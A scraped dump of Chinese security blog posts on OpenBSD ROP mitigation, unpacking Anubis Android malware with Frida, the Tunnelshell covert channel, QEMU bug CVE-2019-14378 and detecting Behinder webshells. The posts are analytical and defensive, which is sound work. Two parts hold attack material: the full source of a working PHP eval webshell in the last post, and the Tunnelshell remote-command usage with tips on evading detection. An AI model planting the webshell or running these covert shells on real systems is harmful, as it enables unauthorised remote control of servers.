%rbpc3 retq 比如你想执行 1execve(“/bin//sh”, NULL, NULL) 你可能需要布置下面的ROP链 目的就是将寄存器赋值为相应的值，进行系统调用 ROP Gadgets查找工具有ROPGadget、ropper等 作者使用ROPGadget去生成直接可利用的ROP链 如何减少ROP Gadgets作者讲了两个思路：1、编译出非预期的returns（就是不是我们经常看到的pop pop ret）2、使正常的returns难以构成ROP链 并不需要使ROP Gadgets的数量变为0，只需要减少ROP Gadgets的数量使得构建一个可用的ROP链变得困难或者不可能（我们可以用上面的ROP Gadgets查找工具来衡量效果） Polymorphic Gadget的减少Polymorphic Gadget 中文直接翻译叫多态Gadget 看了下作者的例子就是通过地址偏移来获得Gadget 在x86/amd64有四种ret类型 抓主要矛盾：C3 ret是最常见的，也是最容易用在Gadget上的 从两方面减少polymorphic gadgets 1、寄存器的选择2、代码的生成 寄存器的选择 常见的带c3结尾的gadgets，ret前面的汇编指令的ModR/M字节（汇编指令中，Opcode之后就是ModR/M）经常使用的寄存器如下：（这里说的比如常见的汇编：mov ebx,eax） 源寄存器使用RAX/EAX/AX/AL 目的寄存器使用RBX/EBX/BX/BL 此外下面的指令也经常操作RBX / EBX / BX / BL，比如inc, dec, test 而带B系列的寄存器代理很多c3字节 所以一个idea就是避免使用RBX/EBX/BX/BL Clang按此顺序分配寄存器：RAX, RCX, RDX, RSI, RDI, R8, R9, R10, R11, RBX, R14,R15, R12, R13, RBP 可以将RBX寄存器几乎挪到最后：RAX, RCX, RDX, RSI, RDI, R8, R9, R10, R11, R14, R15,R12, R13, RBX, RBP 当然ebx的顺序也是要改变的 这样，性能的损耗为0，代码的字节可以忽略不计（因为有一些REX prefix字节） 最终减少了kernel的大概4500个唯一gadgets（约为6%），效果还是有的 代码的生成 我们知道有哪些指令会有return的字节（比如c3）1、ModR/M, SIB或者特殊的指令2、还有就是常量包含了return字节 我们可以实现相同的功能，但是不使用rerun字节或者要求强制对齐 对于ModR/M, SIB会出现return字节的如下 减少的方法就是1、先交换寄存器2、用寄存器进行操作3、再交换回来 例子如下： 如果上面的方法不能使用，我们就要使用强制对齐，比如我们可以在指令前插入一个陷阱来减少gadget 正常的程序会跳过我们的陷阱 return字节前面的int3会使得gadget受限 例子如下： 损耗总结：1、效率损耗约为1%，因为xchg指令很快2、代码方面，影响较小，多了6个字节，一对xchg指令3、用来强制对齐的字节在4-11个4、总的来说增大了kernel的大小约为2.5% 最终减少了kernel约60%的gadgets 但是我们还有一些可做1、清理一些汇编函数2、一些常量可能需要转换3、重定向地址 对齐的gadget的减少（Aligned Gadget Reduction）就是没有进行地址偏移的gadget 首先介绍下RETGUARD（小写好看一点retguard，这个其实跟windows和linux的GS/CANARY的是一样的） 实现如下：1、给每个函数分配一个随机的cookie（用openbsd.randomdata section来分配）2、函数开始处：计算cookie^return address，放在栈帧上，记为saved value 3、在函数返回时，计算saved value^return address，再跟cookie比较，不相等就终止程序运行 值得注意的是在返回前加了je还有int 3指令，这才是减少gadgets的功臣 因为你要把这当做gadget，你必须跳过int 3，再往前就是必须满足cookie的比较，而cookie无法预测，那就没法用了啊 方法小结：1、损耗：运行时间多了约2%，还有就是初始化cookie的时间是可变的（跟函数的数量有关）2、代码方面：每个函数多了31个byte，而kernel大约大了7% 最终减少了50%的gadget，15-25%的唯一gadget 针对于Arm64arm64是有固定的指令长度，所以没有不对齐的gadget，只有对齐的gadget 对于对齐gadget的减少同样也可以是上面int 3的思路，只不过arm64是brk #0x1 这样就几乎删除绝大多数gadget了 在6.3-release arm64 kernel中ROP gadgets的数量：69935在6.4-release arm64 kernel中ROP gadgets的数量：46 而剩余的gadget是在引导代码中的汇编中，具体如下： create_pagetables link_l0_pagetable link_l1_pagetable build_l1_block_pagetable build_l2_block_pagetable 引导后OpenBSD可以unlink或粉碎引导代码，那么这些功能在系统运行时就不可用 那么在用户层，那么gadget也几乎为0了，可能存在于crt0，ld.so 最后看看效果图，先看统计的 看看常用的库还有sshd服务 最后看看ROPGadget查找效果，已经不能自动化构成利用链了 这是6.4的libc 6.5的更加惨不忍睹 结尾还有更多东西可做 比如重定向地址，剩余的可用于gadget的汇编，JOP还没有动 参考AsiaBSDCon 2019 —— Removing ROP Gadgets from OpenBSD https://www.openbsd.org/papers/asiabsdcon2019-rop-slides.pdf","categories":[],"tags":[{"name":"ROP","slug":"ROP","permalink":"https://www.giantbranch.cn/tags/ROP/"},{"name":"ROP攻击缓解","slug":"ROP攻击缓解","permalink":"https://www.giantbranch.cn/tags/ROP攻击缓解/"}]},{"title":"翻译——N种脱壳安卓恶意软件的方式","slug":"翻译——N种脱壳安卓恶意软件的方式","date":"2019-10-25T00:00:00.000Z","updated":"2023-10-13T13:14:33.134Z","comments":true,"path":"2019/10/25/翻译——N种脱壳安卓恶意软件的方式/","link":"","permalink":"https://www.giantbranch.cn/2019/10/25/翻译——N种脱壳安卓恶意软件的方式/","excerpt":"","text":"之前Anubis这个安卓恶意软件家族比较流行，而且通过官方的应用商店进行传播。 Android生态系统中的打包程序下面说的打包程序就是我们常说的加固，但是呢，恶意软件也用，用于隐藏他们恶意的payloads。这包含反射，混淆，控制流平坦化和垃圾代码，当然Anubis 也是使用了这些来阻碍我们分析。 在运行时加载类Android应用程序必须在AndroidManifest文件中定义其使用的服务，接收器和活动类才能使用它们。在Anubis示例中，很明显，清单文件中未定义的许多类仅存在于源代码中。 这意味着应在运行时将具有未定义类的文件加载到应用程序中。Android中有两种主要的运行时加载方式： 从文件：1、API26之后，dalvik.system.DexFile.loadDex2、dalvik.system.DexClassLoader3、dalvik.system.PathClassLoader 从内存：1、dalvik.system.InMemoryDexClassLoader（在恶意软件中不常见） 从文件加载需要在文件系统中存在一个dex / jar文件。Anubis解压缩加密的数据文件，然后删除解密的版本。后来，恶意软件继续将解密的dex加载到应用程序中。使用DexClassLoader加载后，恶意软件会删除解密的dex文件。跟踪dexClassLoader应该使加载例程清晰可见。由于dexClassLoader是dalvik.system的类，因此在代码中应包含“ dalvik.system.dexClassLoader”包，但找不到它。 反射处理恶意软件时，另一个有用的方法是反射。反射是Java中的一个重要概念，它使您可以在不了解方法/类的情况下调用它们。有几种反映的类/方法。 java.lang.Class.forName java.lang.ClassLoader.loadClass java.lang.reflect.Method java.lang.Class.getMethods forName的用法示例 1cObj = Class.forName(&quot;dalvik.system.dexClassLoader&quot;); cObj变量保存dexClassLoader的类对象。这使程序可以调用任何给定类的方法。问题是找到对反射方法进行函数调用的位置。 使用Frida抓取packersfrida是几乎每个操作系统都支持的动态检测工具包。Frida使得可以注入一段代码来操纵目标程序并跟踪程序调用。在这种情况下，它将用于跟踪进行了哪些反射调用，从而分析线程。进行前面提到的函数调用时，将另外调用console.log。但是在此之前，让我们快速回顾一下如何在Android模拟器上设置Frida。 从以下位置下载适合您的仿真器的frida-server：（例如Genymotion使用x86架构。）https://github.com/frida/frida/releases。 12345adb push frida-server /data/local/tmpadb shellcd /data/local/tmpchmod +x frida-server./frida-server &amp; Frida工具在主机中安装 1pip install frida-tools 设置完成后，我们可以编写一个脚本来挂钩目标方法。先定义一些类方法等 1234567891011121314var classDef = Java.use(&apos;java.lang.Class&apos;);var classLoaderDef = Java.use(&apos;java.lang.ClassLoader&apos;);var loadClass = classLoaderDef.loadClass.overload(&apos;java.lang.String&apos;, &apos;boolean&apos;);var forName = classDef.forName.overload(&apos;java.lang.String&apos;, &apos;boolean&apos;, &apos;java.lang.ClassLoader&apos;);var reflect = Java.use(&apos;java.lang.reflect.Method&apos;)var member = Java.use(&apos;java.lang.reflect.Member&apos;)var dalvik = Java.use(&quot;dalvik.system.DexFile&quot;)var dalvik2 = Java.use(&quot;dalvik.system.DexClassLoader&quot;)var dalvik3 = Java.use(&quot;dalvik.system.PathClassLoader&quot;)//var dalvik4 = Java.use(&quot;dalvik.system.InMemoryDexClassLoader&quot;)var f = Java.use(&quot;java.io.File&quot;)var url = Java.use(&quot;java.net.URL&quot;)var obj = Java.use(&quot;java.lang.Object&quot;)var fo = Java.use(&quot;java.io.FileOutputStream&quot;) 我们将使用此代码段更改方法的实现 12345class.targetmethod.implementation = function()&#123; console.log(&quot;[+] targetmethod catched !&quot;) stackTrace() return this.targetmethod()&#125; console.log(“[+] {x} function catched !”) 将使我们能够查看该函数是否被调用。如果函数采用任何参数（例如字符串），则在分析过程中记录这些参数可能会有所帮助。然后，我们可以获得有关所处线程的更多信息。Frida可以调用任何Android函数，包括getStackTrace()。但这需要引用当前线程对象。让我们从获取线程类的实例开始： 12var ThreadDef = Java.use(&apos;java.lang.Thread&apos;);var ThreadObj = ThreadDef.$new(); ThreadObj保存Thread类的实例，currentThread()可用于获取线程。调用getStackTrace()，我们可以遍历stackElements来打印调用堆栈。 12345678function stackTrace() &#123; console.log(&quot;------------START STACK---------------&quot;) var stack = ThreadObj.currentThread().getStackTrace(); for (var i = 0; i &lt; stack.length; i++) &#123; console.log(i + &quot; =&gt; &quot; + stack[i].toString()); &#125; console.log(&quot;------------END STACK---------------&quot;); &#125; 打印调用堆栈有助于识别反射和拆包机制的调用图。例如，dexClassLoader可能创建了反射。但是，当frida hook了dexClassLoader并打印调用堆栈时，我们可以在调用dexClassLoader之前看到这些函数。在应用程序的最开始就调用了解包例程。因此，应该尽快安装frida以赶上解包过程。幸运的是，frida中的-f选项使frida能够生成目标应用程序本身。frida接受带有-l参数的脚本。frida -U -f appname -l dereflect.js然后，frida等待用户输入继续。%resume将恢复该过程。完整脚本可在我的github存储库中找到。https://github.com/eybisi/nwaystounpackmobilemalware/blob/master/dereflect.js 带stackTrace()的输出 您可以看到在write方法之前调用的函数。跟踪这些间隔函数后，您可以在它们之前看到RNlkfTEUX和lqfRafMrGew被调用。事实证明，它们是用于解密加密文件的非常重要的功能，稍后我们将再次介绍。 如何脱壳呢 动态hooking：拦截file.delete (Java level)，或者拦截unlink syscall (system level)从内存里dump：用gameguardian来转存内存或者使用自定义工具转储内存 静态 手动干（作者应该是写脚本的意思吧） 动态的拦截是最简单的办法 通过挂钩：Java级别 当我第一次遇到Anubis并意识到它正在删除文件时，我的第一个解决方案是挂钩到file.delete函数。 12345678910Java.perform(function() &#123; var f = Java.use(&quot;java.io.File&quot;) f.delete.implementation = function(a)&#123; s = this.getAbsolutePath() if(s.includes(&quot;jar&quot;))&#123; console.log(&quot;[+] Delete catched =&gt;&quot; +this.getAbsolutePath()) &#125; return true &#125; &#125;) 这段代码始终将true返回给file.delete函数。截获后，我们就可以知道文件路径，获取到那个jar了 除此之外，我们还可以使用python调用frida使工作自动化，并浏览目标文件所在的文件夹。这些c＆c服务器通常会生成数千个apk。由于它们每个都可以嵌入不同的IP地址，因此自动化工具可以使我们的生活更轻松。 具体参考这个：https://twitter.com/0xabc0/status/1072888987285630976 通过挂钩：系统级别 但是，如果恶意软件使用本机代码删除文件怎么办？我们不能总是钩在Java级别。我们需要更深入。 Unlink 函数有一个参数, 一个文件名的指针. 我们可以通过findExportByName来帮助我们hook. 代码来源于https://www.fortinet.com/blog/threat-research/defeating-an-android-packer-with-frida.html 但我稍微修改，会打印已删除的文件。 1234var unlinkPtr = Module.findExportByName(null, &apos;unlink&apos;);Interceptor.replace(unlinkPtr, new NativeCallback( function (a)&#123; console.log(&quot;[+] Unlink : &quot; + Memory.readUtf8String(ptr(a))) &#125;, &apos;int&apos;, [&apos;pointer&apos;])); 运行结果： 我们截获了unlink调用，因为我们的脚本只是用console.log替换了原始函数的代码，所以文件不会从文件系统中删除。 从内存dump 即使由于文件已加载到进程而从文件系统中删除文件，我们也可以从该进程的内存中获取已删除文件的痕迹。由于Android继承自Linux，因此我们可以使用/proc/pid文件夹为我们提供有关指定进程的内存区域的信息。让我们看一下cat /proc/pid/maps | grep dex过滤dex的目标。 我们发现了dex文件的踪迹。现在我们需要转储这些部分。 使用Gameguardian来转储内存： 这种方法是“作弊”，有一个称为GameGuardian的工具可用于游戏黑客。您可以使用GameGuardian做很多有趣的事情，但是我们现在仅使用转储机制。 让我们从安装和运行APK开始。然后启动GameGuardian，然后从左上方的按钮中选择应用程序名称。选择最右边的按钮及其下面的按钮。现在，您可以在菜单中看到转储内存选项。通过单击箭头按钮放置区域的十六进制代码或选择区域，然后按保存。 我们可以使用以下方法拉出转储的东西 1adb pull /storage/emulated/0/packer . 然后您将在packer文件夹中看到2个文件 1com.eqrxhpdv.cbunlkwsqtz-dfb5a000-e0080000.bin com.eqrxhpdv.cbunlkwsqtz-maps.txt 当使用file命令检查时，它会将我们的dex文件检测为数据文件，所以我们需要删除不属于dex文件的部分来修复。 使用自定义工具转储内存： 感谢@theempire_h，我们可以使用C程序转储目标应用程序的内存区域。https://github.com/CyberSaxosTiGER/androidDump 12345adb push androidDump /data/local/tmpadb shellcd /data/local/tmpchmod +x androidDump./androidDump appname 它转储3个数据块 但是转储后，file命令仍然没有为我们提供正确的类型we事实证明，我们应该对文件进行一些修改。为了找到dex的魔术数字，我编写了此脚本。 https://github.com/eybisi/nwaystounpackmobilemalware/blob/master/deDex.py 1234567891011import binasciiimport sysfilename = sys.argv[1]with open(filename, &apos;rb&apos;) as f: content = f.read()h = binascii.hexlify(content).split(b&apos;6465780a&apos;)h.pop(0)h = b&apos;6465780a&apos; + b&apos;&apos;.join(h)dex = open(sys.argv[1][:-4]+&quot;.dex&quot;,&quot;wb&quot;)dex.write(binascii.a2b_hex(h))dex.close() 修复后我们就可以打开了 我们找到了失去了的class 静态方法： 这是一篇博客文章，从不同的角度解释了解包过程。 https://sysopfb.github.io/malware,/reverse-engineering/2018/08/30/Unpacking-Anubis-APK.html 我在stackTrace的帮助下找到了rc4密钥。但是显然，寻找^这个符号是从Anubis找到RC4例程的一种非常有效的方法。 在JADX中轻松找到rc4密钥，这里有个tips 搜索 “% length” 右键单击要使用的方法，然后点 find Usage 下面的bArr2用作rc4密钥进行解密 有了密钥，我们可以从APK的images文件夹中解密加密的文件。脚本带有2个参数，即bArr2和加密的文件 https://github.com/eybisi/nwaystounpackmobilemalware/blob/master/anubis_manual.py 解密并解压缩后，我们得到了dex 提取配置文件后，还有一个步骤来获取c＆c服务器的地址。恶意软件从电报地址的页面获取，并用ASCII字母更改汉字。然后，它处理base64字符串。解码base64后，它用于service解密使用rc4方案加密的数据。这是一个将中文字符解密为c＆c地址的代码段。（就是将中文一一对应数字字母，还原出数字字母是base64加密的，解密一下就好） https://github.com/eybisi/nwaystounpackmobilemalware/blob/master/solve_chinese.py 我设法用Androguard在没有在模拟器中运行APK，去解密了Anubis payloads。转储dex文件后，我的脚本将找到打印c2和加密密钥的config类。Config Class位于a,b or c 或者较新版本的ooooooooooooo{0,2}o中 通过检查类源代码中“ this”关键字的计数，我设法解密了所有版本的anubis。这是我的脚本的输出，用于从Anubis示例中获取c2和密钥。 结论有很多解压缩安卓恶意软件和跟踪pack机制的方法，我们会在未来看到恶意软件使用dalvik.system.InMemoryDexClassLoader，如果使用此选项，则删除挂钩将无法捕获已删除的文件，因为一切都将在内存中完成，但是转储内存将捕获这些方法。知道不同的方式总是有帮助的。 参考链接https://pentest.blog/n-ways-to-unpack-mobile-malware/","categories":[],"tags":[{"name":"Malware","slug":"Malware","permalink":"https://www.giantbranch.cn/tags/Malware/"},{"name":"脱壳","slug":"脱壳","permalink":"https://www.giantbranch.cn/tags/脱壳/"},{"name":"恶意软件","slug":"恶意软件","permalink":"https://www.giantbranch.cn/tags/恶意软件/"},{"name":"Android","slug":"Android","permalink":"https://www.giantbranch.cn/tags/Android/"}]},{"title":"“远古时代”的隐秘网络通信简析","slug":"“远古时代”的隐秘网络通信简析","date":"2019-10-11T00:00:00.000Z","updated":"2023-10-13T13:14:33.130Z","comments":true,"path":"2019/10/11/“远古时代”的隐秘网络通信简析/","link":"","permalink":"https://www.giantbranch.cn/2019/10/11/“远古时代”的隐秘网络通信简析/","excerpt":"","text":"之所以称为远古时代，是因为下面的分析基于2002，2003年的一个工具，有一个服务端和客户端，可以用各种协议来执行命令。 实验环境1、两个ubuntu 16.042、工具：Tunnelshell 2.3 工具链接： https://packetstormsecurity.com/search/files/?q=Tunnelshell 直接利用ip协议被控服务器执行 1sudo ./tunneld 控制服务器 1sudo ./tunnel -t frag 10.10.10.2 我执行两个命令，分别是id和whoami，抓到的包如下： 这样是直接在ip层上面传数据，清晰明了，但是假如人看的话太明显了，不知道检测设备会不会直接检查ip层上面的数据层，毕竟是02，03年的工具 优点 直接使用ip协议，可能检测设备不太会关注 这样本地不用监听端口，增强对于本地的隐秘性 改进建议 建议对传输的数据进行加密，比如aes，des都可以，密钥可以通过命令行参数设置 通过ICMP协议传输被控端 1sudo ./tunneld -t icmp -m echo-reply,echo 控制端 1sudo ./tunnel -t icmp -m echo-reply,echo 10.10.10.2 我们执行命令id，查看数据包，是通过icmp的data部分传输数据 回应 其实回应命令执行结果之前，还回了个跟客户端一样的data，即执行的命令id 优点 icmp可能检测设备也不太会关注 这样本地不用监听端口，增强对于本地的隐秘性 改进建议 建议对传输的数据进行加密，比如aes，des都可以，密钥可以通过命令行参数设置 通过TCP协议传输被控端 1sudo ./tunneld -t tcp -p 80,2000 控制端 1sudo ./tunnel -t tcp -p 80,2000 10.10.10.2 同样，也是执行id命令 可以看到是通过tcp协议上的tcp payload传输数据 优点 可以看到上面其实他是没有监听端口的，应该是通过抓包实现的，因为返回了RST，ACK这样的端口关闭的包，当然也像上面一样本地不用监听端口，增强对于本地的隐秘性 改进建议 建议对传输的数据进行加密，比如aes，des都可以，密钥可以通过命令行参数设置 利用UDP协议被控端 1sudo ./tunneld -t udp -p 53,2000 控制端 1sudo ./tunnel -t udp -p 53,2000 10.10.10.2 数据包如下： 可以看到其实是直接使用UDP协议，一些之后直接接命令或者命令执行的结果 优点 可以看到上面其实是没有监听端口的，应该是通过抓包实现的，因为返回了icmp目标不可达的包，当然也像上面一样本地不用监听端口，增强对于本地的隐秘性 改进建议 建议对传输的数据进行加密，比如aes，des都可以，密钥可以通过命令行参数设置 总结其实参考文章的原作者把tcp当作http，udp利用53端口来以为是dns，其实都不太算 我们现在看到的dns是通过域名的信息来通信的，比如TXT查询记录 其实现在很多东西未来规避检测，基本都加密了，webshell管理工具也加密了，这肯定的也是现在及未来的方向，虽然工具是2003年的，但是也值得简单看看 参考https://www.hackingarticles.in/covert-channel-the-hidden-network/","categories":[],"tags":[{"name":"隐秘通信","slug":"隐秘通信","permalink":"https://www.giantbranch.cn/tags/隐秘通信/"}]},{"title":"QEMU 虚拟机逃逸漏洞（CVE-2019-14378）漏洞分析","slug":"QEMU 虚拟机逃逸漏洞（CVE-2019-14378）漏洞分析","date":"2019-10-09T00:00:00.000Z","updated":"2023-10-13T13:14:33.058Z","comments":true,"path":"2019/10/09/QEMU 虚拟机逃逸漏洞（CVE-2019-14378）漏洞分析/","link":"","permalink":"https://www.giantbranch.cn/2019/10/09/QEMU 虚拟机逃逸漏洞（CVE-2019-14378）漏洞分析/","excerpt":"","text":"这是qemu在网络实现的时候的一个指针错误，当重组大量的ipv4分段数据包时会触发错误，这还是大牛通过代码审计发现的，厉害啊。 漏洞细节qemu的网络有两部分1、为虚拟机提供的虚拟网卡（比如PCI网卡）2、与网络接口控制器交互的网络后端（就是将网络数据包给到主机网络） 默认情况下，QEMU将为guest虚拟机创建SLiRP用户网络后端和适当的虚拟网卡（例如e1000 PCI网卡） 而本漏洞是在SLiRP中的数据包重组中出现的错误。 数据包重组那就需要了解ip分片，ip层的结构如下： 123456789101112131415 0 1 2 3 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|Version| IHL |Type of Service| Total Length |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+| Identification |Flags| Fragment Offset |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+| Time to Live | Protocol | Header Checksum |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+| Source Address |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+| Destination Address |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+| Options | Padding |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ 分片在Flags那里，主要是低3个bit 1234Bit 0: 保留为, 必须为0Bit 1: (DF) 0 = 分片, 1 = 不分片.Bit 2: (MF) 0 =最后一个ip包, 1 = 后面还有分片Fragment Offset: 13 bits 下面看下相关的结构体 1234567891011121314151617181920struct mbuf &#123; /* header at beginning of each mbuf: */ struct mbuf *m_next; /* Linked list of mbufs */ struct mbuf *m_prev; struct mbuf *m_nextpkt; /* Next packet in queue/record */ struct mbuf *m_prevpkt; /* Flags aren&apos;t used in the output queue */ int m_flags; /* Misc flags */ int m_size; /* Size of mbuf, from m_dat or m_ext */ struct socket *m_so; char *m_data; /* Current location of data */ int m_len; /* Amount of data in this mbuf, from m_data */ ... char *m_ext; /* start of dynamic buffer area, must be last element */ char m_dat[];&#125;; mbuf是储存接收到的ip层的信息。有两个buffer，一个是m_dat ，另一个是m_ext，他是m_dat不足以储存的时候，通过在堆上分配内存解决不足的问题 在nat转换的时候，如果传入的数据包是分片的，则应在编辑和重新传输之前重新组装它们。 这个重组由ip_reass(Slirp *slirp, struct ip *ip, struct ipq *fp)函数完成。 ip包含当前的IP数据包数据，fp是包含分段数据包的链表。 ip_reass执行以下操作：1、如果第一个分配的fp为NULL，创建重组队列并将ip插入此队列。2、检查片段是否与先前收到的片段重复，然后丢弃它。3、如果收到所有分段的数据包，则重新组装它。 通过修改第一个数据包的头部为新的ip header。 1234567891011121314151617181920212223242526272829303132333435363738394041424344/* * Take incoming datagram fragment and try to * reassemble it into whole datagram. If a chain for * reassembly of this datagram already exists, then it * is given as fp; otherwise have to make a chain. */static struct ip *ip_reass(Slirp *slirp, struct ip *ip, struct ipq *fp)&#123; ... ... /* * Reassembly is complete; concatenate fragments. */ q = fp-&gt;frag_link.next; m = dtom(slirp, q); q = (struct ipasfrag *)q-&gt;ipf_next; while (q != (struct ipasfrag *)&amp;fp-&gt;frag_link) &#123; struct mbuf *t = dtom(slirp, q); q = (struct ipasfrag *)q-&gt;ipf_next; m_cat(m, t); &#125; /* * Create header for new ip packet by * modifying header of first packet; * dequeue and discard fragment reassembly header. * Make header visible. */ q = fp-&gt;frag_link.next; /* * If the fragments concatenated to an mbuf that&apos;s * bigger than the total size of the fragment, then and * m_ext buffer was alloced. But fp-&gt;ipq_next points to * the old buffer (in the mbuf), so we must point ip * into the new buffer. */ if (m-&gt;m_flags &amp; M_EXT) &#123; int delta = (char *)q - m-&gt;m_dat; q = (struct ipasfrag *)(m-&gt;m_ext + delta); &#125; 这个漏洞在于计算变量delta的值有问题，而上面这个代码假定了第一个分片数据包不会在external buffer中分配（m_ext）。当分片数据在mbuf-&gt; m_dat（q将在m_dat内）时，计算q-m-&gt; dat有效（q是包含分片链表和数据包数据的结构）。 否则，如果分配了m_ext缓冲区，则q将位于external buffer ，那么delta的计算就是错误的。 q的数据结构是ipasfrag：就是有一个前向指针跟后向指针，以及包含了一个ip头 12345678910111213/* * Ip header, when holding a fragment. * * Note: ipf_link must be at same offset as frag_link above */struct ipasfrag &#123; struct qlink ipf_link; struct ip ipf_ip;&#125;;struct qlink &#123; void *next, *prev;&#125;; 我们可以调试看看q的某个时刻的状态是怎样的 123456789101112131415161718192021222324gdb-peda$ p *q$30 = &#123; ipf_link = &#123; next = 0x7f9e08084ed0, prev = 0x7f9e0808487c &#125;, ipf_ip = &#123; ip_hl = 0x5, ip_v = 0x4, ip_tos = 0x0, ip_len = 0x8, ip_id = 0x7f3a, ip_off = 0x8, ip_ttl = 0x40, ip_p = 0x1, ip_sum = 0x95e3, ip_src = &#123; s_addr = 0xf02000a &#125;, ip_dst = &#123; s_addr = 0x202000a &#125; &#125;&#125; 可以看到确实是两个ipasfrag前后指针还有ip头信息 我们继续调试运行到下面地方 我们查看下数据结构，可以看到确实此时的q在m_ext的后面，而m_dat在老前面了，那么q - m-&gt;m_dat就是负数了 12345678910111213141516171819202122232425262728293031323334353637383940414243gdb-peda$ p q$41 = (struct ipasfrag *) 0x7f9e0808882cgdb-peda$ p *m$42 = &#123; m_next = 0x7f9e080881a0, m_prev = 0x7f9e080874c0, m_nextpkt = 0x0, m_prevpkt = 0x0, m_flags = 0xd, m_size = 0xcde, m_so = 0x0, m_data = 0x7f9e08088850 &quot;&quot;, m_len = 0xc98, slirp = 0x563aa67a6380, resolution_requested = 0x0, expiration_date = 0xffffffffffffffff, m_ext = 0x7f9e08088810 &quot;&quot;, m_dat = 0x7f9e08086eb0 &quot;&quot;&#125;gdb-peda$ p *q$43 = &#123; ipf_link = &#123; next = 0x7f9e0808487c, prev = 0x7f9e08087520 &#125;, ipf_ip = &#123; ip_hl = 0x5, ip_v = 0x4, ip_tos = 0x1, ip_len = 0xc90, ip_id = 0x7f3e, ip_off = 0x0, ip_ttl = 0x40, ip_p = 0x1, ip_sum = 0x1c43, ip_src = &#123; s_addr = 0xffffff8b &#125;, ip_dst = &#123; s_addr = 0x0 &#125; &#125;&#125; 简单的示意图如下：（忽略了分配了m_ext缓冲区，则q将位于external buffer） 123456789101112131415161718+------------------------------+| || || || || m_dat 0x7f9e08086eb0 || || |+------------------------------+| ||m-&gt;m_ext 0x7f9e08088810 || || ||q 0x7f9e0808882c || || || |+------------------------------+ 之后，新计算的指针q被转换为ip结构并且修改部分字段。由于错误地计算了delta，ip将指向不正确的位置，并且ip_src和ip_dst可用于将我们可控的数据写入错误计算的ip的位置。 如果计算出的ip位于没有映射的内存区域，这就会使qemu崩溃。 123456slirp/src/ip_input.c:ip_reass ip = fragtoip(q); //转换 ip-&gt;ip_len = next; ip-&gt;ip_tos &amp;= ~1; ip-&gt;ip_src = fp-&gt;ipq_src; ip-&gt;ip_dst = fp-&gt;ipq_dst; 参考https://blog.bi0s.in/2019/08/24/Pwn/VM-Escape/2019-07-29-qemu-vm-escape-cve-2019-14378/","categories":[],"tags":[{"name":"qemu","slug":"qemu","permalink":"https://www.giantbranch.cn/tags/qemu/"},{"name":"虚拟机逃逸","slug":"虚拟机逃逸","permalink":"https://www.giantbranch.cn/tags/虚拟机逃逸/"}]},{"title":"冰蝎动态二进制加密WebShell的检测","slug":"冰蝎动态二进制加密WebShell的检测","date":"2019-10-08T00:00:00.000Z","updated":"2023-10-13T13:14:33.130Z","comments":true,"path":"2019/10/08/冰蝎动态二进制加密WebShell的检测/","link":"","permalink":"https://www.giantbranch.cn/2019/10/08/冰蝎动态二进制加密WebShell的检测/","excerpt":"","text":"中国菜刀等工具管理WebShell的时候会有一些固定的特征，容易被waf或者IPS检测到，最近1年出来了个动态加密的WebShell管理工具，给检测带来了一定的困难，所以写个文章简单解剖一下 注：本文只针对当前的最新版冰蝎(Behinder) v2.0.1，以php webshell为例，其他webshell只是有细微的差别，有兴趣可以自行研究 实验环境 客户端： windows 7 + 冰蝎(Behinder) v2.0.1 服务端：ubuntu 16.04 + apache + php webshell文件分析以php为例 123456789101112131415161718192021222324252627282930313233&lt;?php@error_reporting(0);session_start();if (isset($_GET[&apos;pass&apos;]))&#123; $key=substr(md5(uniqid(rand())),16); $_SESSION[&apos;k&apos;]=$key; print $key;&#125;else&#123; $key=$_SESSION[&apos;k&apos;]; $post=file_get_contents(&quot;php://input&quot;); if(!extension_loaded(&apos;openssl&apos;)) &#123; $t=&quot;base64_&quot;.&quot;decode&quot;; $post=$t($post.&quot;&quot;); for($i=0;$i&lt;strlen($post);$i++) &#123; $post[$i] = $post[$i]^$key[$i+1&amp;15]; &#125; &#125; else &#123; $post=openssl_decrypt($post, &quot;AES128&quot;, $key); &#125; $arr=explode(&apos;|&apos;,$post); $func=$arr[0]; $params=$arr[1]; class C&#123;public function __construct($p) &#123;eval($p.&quot;&quot;);&#125;&#125; @new C($params);&#125;?&gt; 其实就两个功能1、首先存在pass参数的情况（其实这个就是通常所说的一句话木马），就是通过截取随机数的md5的高16位作为密钥，保存在服务器的全局 $_SESSION变量中，同时打印出来，这样客户端接收到就可以用这个密钥进行通信了 2、假如不带参数，就是加密通信的过程。假如php不存在openssl这个extension，就是用base64解码后，使用key进行循环异或解密。而存在openssl就使用AES128进行解密 基于上面分析可以得到通信流程 下面我们看看实际通信流量 数据包分析通过在服务器上传webshell，客户端连接后通过wireshark抓取数据包 可以看到请求了两次密钥才开始真正的POST通信 接下来的通信，就是AES128加密后的base64密文 所以我们检测只能从请求密钥阶段入手了 通过获取密钥的数据包，我们发现以下特征1、使用GET方法2、参数名即木马的密码（这个可以修改，不能作为特征），但是参数值为纯数字可以作为特征，暂时来看应该1到5位数字可以匹配到了，保险一点可以1-8都可以3、请求中有HEADER字段：Content-type: application/x-www-form-urlencoded4、响应中会有Content-Length: 165、当然响应的body肯定也是16长度，而且字符是16进制的字符，即[0-9a-f] 通信过程实际发送的payload通过在webshell中加入如下代码，即可获得解密后的payload 获得的如下：（由于base64_decode后面的比较长所以省略了） 1assert|eval(base64_decode(&apos;QGVycm9yX3JlcG9ydGluZygwKTsNCg0KZnVuY..............................&apos;)); 所以它就是将字符串base64解密之后通过eval执行 解码上面的base64串得到下面真正的代码（下面是以命令执行为例的代码） 